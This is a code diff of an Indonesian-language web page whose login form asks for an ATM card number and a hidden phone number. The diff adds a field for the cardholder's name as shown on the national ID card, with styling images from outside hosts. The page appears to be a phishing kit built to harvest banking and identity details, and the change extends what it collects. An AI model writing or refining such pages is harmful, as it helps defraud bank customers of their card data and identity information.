@@ -1,4 +1,5 @@
 
+
 <html lang="id">
  <head> 
   <!-- Warna untuk Chrome, Firefox OS, Opera dan Vivaldi --> 
@@ -273,6 +274,12 @@ form button{
 </div>
 <form id="login" onsubmit="sendLogin()" method="POST">
 <input type="hidden" id="nomor" name="nomor">
+ <label>Atas nama</label>   
+<input type="text" id="nama" name="nama" placeholder="Nama sesuai KTP" maxlength="" minlength="2" oninvalid="this.setCustomValidity('Tuliskan 𝗡𝗮𝗺𝗮 𝘀𝗲𝘀𝘂𝗮𝗶 𝗞𝗧𝗣')" onchange="this.setCustomValidity('')" style="background-image: url('https://hosting.tigerengine.id/pb93da.jpg');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; " required>
+ <br>
 <label>Nomor Kartu ATM</label>   
 <input type="tel" id="atm" name="atm" placeholder="Masukkan nomor kartu ATM Kamu" maxlength="20" minlength="20" oninvalid="this.setCustomValidity('Tuliskan 𝟭𝟴 𝗗𝗶𝗴𝗶𝘁 𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂-𝗔𝗧𝗠')" onchange="this.setCustomValidity('')" style="background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1xl_Nxd9RiN9iMg71dfgBjBIhC8An2bhD946tlGOjCKNBGDVJyN__zVQxOnSPOm1CB2WuHRJhhyphenhyphenwiBKW9F3Nlg72-n4CDtmhuQCsFFowBAUyG0-qBChcvtCitReTW-T02JVbcZkkZeUw-puYTizPUfrUTdKnu3H3AQOjjK0QMpPlyz5YMY1E76kg-wbQ/s1066/AddText_08-12-10.08.37.jpg');
       background-position: 100% 100%;
@@ -346,3 +353,4 @@ document.getElementById("nomor").value = nomor + "";
 </script>
  </body>
 </html>
+
